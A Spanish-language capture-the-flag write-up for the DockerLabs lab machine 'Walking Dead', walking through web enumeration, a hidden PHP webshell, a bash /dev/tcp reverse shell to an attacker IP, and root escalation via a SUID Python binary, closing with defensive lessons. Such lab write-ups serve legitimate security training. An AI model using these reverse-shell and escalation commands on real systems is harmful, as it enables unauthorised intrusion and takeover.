# Walking Dead — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** JuanR  
**Fecha de creación:** 13/02/2025  
**Técnicas:** Gobuster · Hidden WebShell · Reverse Shell · Command Execution · SUID · Python privilege escalation · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Hidden WebShell — ejecución de comandos](#3-hidden-webshell--ejecución-de-comandos)
4. [Reverse Shell](#4-reverse-shell)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh walking_dead.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/hidden
/backup.txt
```

Exploramos los recursos encontrados.

La página principal muestra:

```text
The Walking Dead - CTF
Survive... if you can.
```

Inspeccionando el código fuente encontramos una referencia oculta:

```html
<a href="hidden/.shell.php">Access Panel</a>
```

---

## 3. Hidden WebShell — ejecución de comandos

Accedemos al panel oculto:

```text
http://172.17.0.2/hidden/.shell.php
```

Probamos ejecución de comandos:

```text
http://172.17.0.2/hidden/.shell.php?cmd=id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La aplicación permite ejecución arbitraria de comandos.

---

## 4. Reverse Shell

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell Bash:

```text
http://172.17.0.2/hidden/.shell.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
```

Obtenemos acceso remoto:

```bash
whoami
www-data
```

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root -ls 2>/dev/null
```

Resultado relevante:

```text
/usr/bin/python3.8
```

---

## 5. Escalada de privilegios

Consultamos GTFOBins para Python SUID.

Payload utilizado:

```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| WebShell oculta accesible públicamente | Ejecución remota de comandos |
| Reverse Shell Bash | Acceso interactivo al sistema |
| Python con permisos SUID | Escalada a root |

**Para defenderse:**

- Eliminar WebShells y archivos ocultos accesibles desde web.
- Restringir ejecución arbitraria de comandos.
- Auditar binarios SUID peligrosos.
- Aplicar principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
